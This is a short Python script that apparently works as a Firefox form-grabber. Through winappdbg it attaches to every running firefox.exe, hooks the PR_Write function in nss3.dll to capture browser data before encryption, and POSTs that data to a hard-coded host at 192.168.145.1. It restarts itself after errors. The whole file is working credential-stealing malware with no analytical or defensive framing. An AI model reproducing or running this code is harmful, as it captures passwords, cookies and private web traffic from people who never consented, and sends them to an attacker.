from winappdbg import Debug, EventHandler
import time
import requests

string =''

def lol(event,ra,arg1,buffer,arg3):
    global process
    global string
    string += process.read(buffer,1024*4)
    try:
        requests.post(url='http://192.168.145.1',data=string)
    except:
        pass



class event_handler_class(EventHandler):

    def load_dll(self, event):
        if event.get_module().match_name('nss3.dll'):
            address = event.get_module().resolve('PR_Write')
            pid = event.get_pid()
            event.debug.hook_function(pid,address,preCB=lol,postCB=None,paramCount=3,signature=None)


debug = Debug(event_handler_class())

def main():
    try:
        global process
        for (process,name) in debug.system.find_processes_by_filename('firefox.exe'):
            print"[+] Firefox Running with PID ",process.get_pid()
            debug.attach(process.get_pid())

        debug.loop()

    except KeyboardInterrupt:
        debug.stop()
        exit(0)

    except:
        debug.stop()
        time.sleep(5)
        main()

    finally:
        debug.stop()
        time.sleep(5)
        main()


        
main()

